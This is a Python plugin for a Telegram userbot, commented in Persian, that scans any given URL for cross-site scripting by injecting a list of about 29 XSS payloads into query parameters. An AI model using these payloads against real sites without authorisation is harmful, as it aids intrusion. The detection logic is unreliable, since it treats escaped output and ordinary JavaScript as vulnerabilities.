# plugins/xssscanner.py

from telethon import events
from client import client
import aiohttp
import urllib.parse
import re
import asyncio
import html
import json
from typing import List, Dict, Optional

class XSSScanner:
    def __init__(self):
        self.vulnerable_urls = []
        self.payloads = {
            'reflected': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '"><img src=x onerror=alert("XSS")>',
                '\';alert("XSS");//',
                '";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                '<script>prompt("XSS")</script>',
                '<script>confirm("XSS")</script>'
            ],
            'dom_based': [
                '#<script>alert("DOM-XSS")</script>',
                'javascript:alert("DOM-XSS")',
                'data:text/html,<script>alert("DOM-XSS")</script>',
                '<img src="javascript:alert(\'DOM-XSS\')">'
            ],
            'stored': [
                '<script>alert("Stored-XSS")</script>',
                '<img src=x onerror=alert("Stored-XSS")>',
                '<svg onload=alert("Stored-XSS")>'
            ]
        }
        self.session = None
        
    async def test_reflected_xss(self, url: str, param: str) -> List[Dict]:
        """تست XSS منعکس شده"""
        vulnerabilities = []
        
        for payload in self.payloads['reflected']:
            try:
                test_url = self._build_test_url(url, param, payload)
                
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    content = await resp.text()
                    
                    # بررسی وجود payload در response
                    if self._check_xss_reflection(content, payload):
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'reflected',
                            'severity': self._calculate_severity(payload, content),
                            'context': self._analyze_context(content, payload)
                        })
                        
            except Exception:
                continue
                
        return vulnerabilities
    
    async def test_dom_xss(self, url: str) -> List[Dict]:
        """تست DOM-based XSS"""
        vulnerabilities = []
        
        for payload in self.payloads['dom_based']:
            try:
                # تست با fragment identifier
                test_url = f"{url}{payload}"
                
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    content = await resp.text()
                    
                    # بررسی کدهای JavaScript که ممکن است آسیب‌پذیر باشند
                    if self._check_dom_vulnerability(content):
                        vulnerabilities.append({
                            'url': test_url,
                            'param': 'DOM',
                            'payload': payload,
                            'type': 'dom_based',
                            'severity': 'high',
                            'context': 'DOM manipulation'
                        })
                        
            except Exception:
                continue
                
        return vulnerabilities
    
    def _build_test_url(self, base_url: str, param: str, payload: str) -> str:
        """ساخت URL تست با payload"""
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _check_xss_reflection(self, content: str, payload: str) -> bool:
        """بررسی انعکاس payload در محتوا"""
        # بررسی مستقیم
        if payload in content:
            return True
            
        # بررسی HTML encoded
        encoded_payload = html.escape(payload)
        if encoded_payload in content:
            return True
            
        # بررسی URL encoded
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in content:
            return True
            
        # بررسی بخش‌هایی از payload
        dangerous_parts = ['<script', 'onerror', 'onload', 'javascript:', 'alert(']
        for part in dangerous_parts:
            if part in payload and part in content.lower():
                return True
                
        return False
    
    def _check_dom_vulnerability(self, content: str) -> bool:
        """بررسی آسیب‌پذیری DOM-based"""
        dom_patterns = [
            r'document\.location',
            r'window\.location',
            r'document\.URL',
            r'document\.referrer',
            r'window\.name',
            r'location\.hash',
            r'location\.search',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'document\.write\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\('
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
                
        return False
    
    def _calculate_severity(self, payload: str, content: str) -> str:
        """محاسبه شدت آسیب‌پذیری"""
        if '<script>' in payload.lower() and '<script>' in content.lower():
            return 'critical'
        elif any(event in payload.lower() for event in ['onerror', 'onload', 'onfocus']):
            return 'high'
        elif 'javascript:' in payload.lower():
            return 'medium'
        else:
            return 'low'
    
    def _analyze_context(self, content: str, payload: str) -> str:
        """تحلیل context قرارگیری payload"""
        payload_index = content.find(payload)
        if payload_index == -1:
            return 'unknown'
            
        # بررسی محیط اطراف payload
        start = max(0, payload_index - 50)
        end = min(len(content), payload_index + len(payload) + 50)
        context = content[start:end]
        
        if '<input' in context.lower():
            return 'input_field'
        elif '<textarea' in context.lower():
            return 'textarea'
        elif '<script' in context.lower():
            return 'script_tag'
        elif 'href=' in context.lower():
            return 'link_attribute'
        elif 'src=' in context.lower():
            return 'src_attribute'
        else:
            return 'html_content'

@client.on(events.NewMessage(pattern=r"\.xss(?:\s+(.+))?", outgoing=True))
async def xss_scanner(event):
    url_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()

    if not url_input and reply:
        url_input = reply.message.strip()

    if not url_input:
        await event.reply("""
🔍 **Advanced XSS Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**استفاده:**
`.xss https://example.com/search.php?q=test`
`.xss http://target.com/page.php?id=1`

**قابلیت‌های پیشرفته:**
• تست Reflected XSS با 20+ payload
• شناسایی DOM-based XSS
• تحلیل context قرارگیری
• ارزیابی شدت آسیب‌پذیری
• گزارش تفصیلی امنیتی
• پشتیبانی از انواع encoding

**انواع تست:**
🔴 **Reflected XSS** - انعکاس در response
🟠 **DOM-based XSS** - دستکاری DOM
🟡 **Context Analysis** - تحلیل محیط

⚠️ **هشدار:** فقط برای تست سایت‌های خودتان!
        """.strip())
        return

    await event.edit("🔍 شروع اسکن پیشرفته XSS...")

    try:
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'https://' + url_input

        parsed_url = urllib.parse.urlparse(url_input)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            await event.edit("❌ URL باید حاوی پارامتر باشد (مثل ?q=test)")
            return

        scanner = XSSScanner()
        all_vulnerabilities = []
        
        await event.edit(f"🔍 تست {len(params)} پارامتر برای XSS...")

        async with aiohttp.ClientSession() as session:
            scanner.session = session
            
            # تست Reflected XSS
            for param_name in params.keys():
                await event.edit(f"🔍 تست Reflected XSS در {param_name}...")
                reflected_vulns = await scanner.test_reflected_xss(url_input, param_name)
                all_vulnerabilities.extend(reflected_vulns)
            
            # تست DOM-based XSS
            await event.edit("🔍 تست DOM-based XSS...")
            dom_vulns = await scanner.test_dom_xss(url_input)
            all_vulnerabilities.extend(dom_vulns)

        # تجزیه و تحلیل نتایج
        await event.edit("📊 تحلیل نتایج XSS...")
        
        if all_vulnerabilities:
            # گروه‌بندی بر اساس نوع و شدت
            vuln_by_type = {}
            vuln_by_severity = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
            
            for vuln in all_vulnerabilities:
                vuln_type = vuln['type']
                severity = vuln['severity']
                
                if vuln_type not in vuln_by_type:
                    vuln_by_type[vuln_type] = []
                vuln_by_type[vuln_type].append(vuln)
                vuln_by_severity[severity] += 1
            
            # ساخت گزارش
            type_summary = []
            type_icons = {'reflected': '🔴', 'dom_based': '🟠', 'stored': '🟡'}
            
            for vuln_type, vulns in vuln_by_type.items():
                icon = type_icons.get(vuln_type, '⚠️')
                type_name = vuln_type.replace('_', ' ').title()
                type_summary.append(f"  {icon} **{type_name}:** {len(vulns)} مورد")
            
            # نمایش آسیب‌پذیری‌های مهم
            critical_vulns = [v for v in all_vulnerabilities if v['severity'] == 'critical'][:3]
            vuln_details = []
            
            for i, vuln in enumerate(critical_vulns):
                short_url = vuln['url'][:60] + '...' if len(vuln['url']) > 60 else vuln['url']
                vuln_details.append(f"  {i+1}. 🔴 `{short_url}`")
                vuln_details.append(f"     📍 Context: {vuln['context']}")
            
            # تعیین سطح خطر کلی
            total_vulns = len(all_vulnerabilities)
            if vuln_by_severity['critical'] > 0:
                risk_level = "🔴 بحرانی"
                risk_color = "🔴"
            elif vuln_by_severity['high'] > 2:
                risk_level = "🟠 بالا"
                risk_color = "🟠"
            elif total_vulns > 3:
                risk_level = "🟡 متوسط"
                risk_color = "🟡"
            else:
                risk_level = "🟢 پایین"
                risk_color = "🟢"
            
            msg = f"""
{risk_color} **گزارش کامل XSS Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
🔍 **پارامترهای تست شده:** {len(params)}
⚠️ **آسیب‌پذیری‌های یافت شده:** {total_vulns}
🚨 **سطح خطر:** {risk_level}

📈 **انواع آسیب‌پذیری:**
{chr(10).join(type_summary)}

📊 **توزیع شدت:**
  🔴 **Critical:** {vuln_by_severity['critical']}
  🟠 **High:** {vuln_by_severity['high']}
  🟡 **Medium:** {vuln_by_severity['medium']}
  🟢 **Low:** {vuln_by_severity['low']}

🔍 **آسیب‌پذیری‌های مهم:**
{chr(10).join(vuln_details) if vuln_details else "  ✅ آسیب‌پذیری بحرانی یافت نشد"}

⚠️ **توصیه امنیتی:** فوری اقدام به رفع آسیب‌پذیری‌های XSS کنید!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()
        else:
            msg = f"""
🟢 **گزارش XSS Scanner**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
🔍 **پارامترهای تست شده:** {len(params)}
✅ **نتیجه:** هیچ آسیب‌پذیری XSS یافت نشد
🚨 **سطح خطر:** 🟢 امن

📈 **تست‌های انجام شده:**
  🔴 **Reflected XSS:** بررسی شد
  🟠 **DOM-based XSS:** بررسی شد
  📊 **Context Analysis:** انجام شد

✅ **سایت در برابر حملات XSS محافظت شده است**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """.strip()

        await event.edit(msg)

    except Exception as e:
        await event.edit(f"⚠️ خطا در اسکن XSS: {str(e)}")
